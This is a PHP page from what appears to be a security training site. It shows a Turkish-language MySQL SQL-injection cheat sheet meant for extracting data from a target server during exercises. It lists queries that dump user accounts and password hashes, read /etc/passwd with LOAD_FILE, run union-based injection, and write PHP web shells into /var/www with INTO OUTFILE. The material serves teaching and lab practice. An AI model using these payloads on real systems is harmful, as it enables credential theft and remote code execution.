
	<?php
    include("header.php");
    include("configuration.php");
    
?>

<div id="fh5co-main">
			<div class="fh5co-narrow-content">
				<h2 class="fh5co-heading animate-box" data-animate-effect="fadeInLeft">Read Our Blog</h2>
				    <div class="row row-bottom-padded-md">
					    <div class="col-md-12 col-sm-12 col-padding animate-box" data-animate-effect="fadeInLeft">
                            <div class="col-md-12" align="center">
                                <h3>Kopya Kağıtları</h3>
                            </div>    
                            <div class="col-md-12">
                                  
                                <div class="col-md-12" >
                                    <p>
                                        Eğitim esnasında hedef sunucudan bilgi çıkarma işlemlerinde sana yardımcı olacak bazı bilgiler aşağıda verilmiştir.
                                    </p>
                                    <hr>
                                    <h4>Information Gathering</h4>
                                        <table class="table table-striped table-hover">
                                            <thead>
                                                <tr>
                                                <th>Description</th>
                                                <th align="left">Query</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                <tr>
                                                <td>Version</td>
                                                <td>SELECT @@version</td>
                                                </tr>
                                                <tr>
                                                <td>User</td>
                                                <td>SELECT user()<br>SELECT system_user()</td>
                                                </tr>
                                                <tr>
                                                <td>Users</td>
                                                <td>SELECT user FROM mysql.user<br>* SELECT Super_priv FROM mysql.user WHERE user= 'root' LIMIT 1,1</td>
                                                </tr>
                                                <tr>
                                                <td>Tables</td>
                                                <td>SELECT table_schema, table_name FROM information_schema.tables</td>
                                                </tr>
                                                <tr>
                                                <td>Columns</td>
                                                <td>SELECT table_name, column_name FROM information_schema.columns</td>
                                                </tr>
                                                <tr>
                                                <td>Databases</td>
                                                <td>SELECT schema_name FROM information_schema.schemata<br></td>
                                                </tr>
                                                <tr>
                                                <td>Current Database Name</td>
                                                <td>SELECT database()</td>
                                                </tr>
                                                <tr>
                                                <td>Query another Database</td>
                                                <td>USE [database_name]; SELECT database();<br>SELECT [column] FROM [database_name].[table_name]</td>
                                                </tr>
                                                <tr>
                                                <td>Number of Columns</td>
                                                <td>SELECT count(*) FROM information_schema.columns WHERE table_name = '[table_name]'</td>
                                                </tr>
                                                <tr>
                                                <td>DBA Accounts</td>
                                                <td>SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'</td>
                                                </tr>
                                                <tr>
                                                <td>Password Hashes</td>
                                                <td>SELECT host, user, password FROM mysql.user</td>
                                                </tr>
                                                <tr>
                                                <td>Schema</td>
                                                <td>SELECT schema()</td>
                                                </tr>
                                                <tr>
                                                <td>Path to Data</td>
                                                <td>SELECT @@datadir</td>
                                                </tr>
                                                <tr>
                                                <td>Read Files</td>
                                                <td>* SELECT LOAD_FILE('/etc/passwd')</td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    <hr>
                                    <h4>Union-based SQLi</h4>
                                    <ul>
                                        <li>Union sorgusunda sol taraftaki sutun sayısı ile sağ taraftaki sutun sayıları eşit olmalıdır.</li>
                                        <li><strong>Örnek bir kullanım:</strong> select * from Blog union select 1,2,3,4,5,table_name,7 from information_schema.tables where table_schema = database();</li>
                                    </ul> 
                                    <hr>
                                    <h4>Uzaktan Kod Çalıştırmak</h4>
                                        <table class="table table-striped table-hover">
                                            <thead>
                                                <tr>
                                                    <th>Description</th>
                                                    <th align="left">Query</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                <tr>
                                                    <td>Command Execution (PHP)</td>
                                                    <td>SELECT "&lt;? echo passthru($_GET['cmd']); ?&gt;" INTO OUTFILE '/var/www/shell.php'</td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    <hr>
                                    <h4>Dosya Okuma ve Yazma</h4>
                                        <table class="table table-striped table-hover">
                                            <thead>
                                                <tr>
                                                    <th>Description</th>
                                                    <th align="left">Query</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                <tr>
                                                    <td>Dump to file</td>
                                                    <td>SELECT * FROM mytable INTO dumpfile '/tmp/somefile'</td>
                                                </tr>
                                                <tr>
                                                    <td>Dump PHP Shell	</td>
                                                    <td>SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'</td>
                                                </tr>
                                                <tr>
                                                    <td>Read File	</td>
                                                    <td>SELECT LOAD_FILE('/etc/passwd')</td>
                                                </tr>
                                            </tbody>
                                        </table>
                                </div>
                                <div class="col-md-12">
                                    <hr>
                                    
                                    <strong>Referanslar</strong>
                                             <p>
                                             https://www.w3resource.com/mysql/mysql-information-functions.php#cons14
                                            </p>
                                            <p>
                                            https://sqlwiki.netspi.com/attackQueries/#mysql
</p>
                                </div>
            
                            </div>
                        </div>
                    
                    
                    </div>
            </div>
        
    <?php
	include("footer.php");
	?>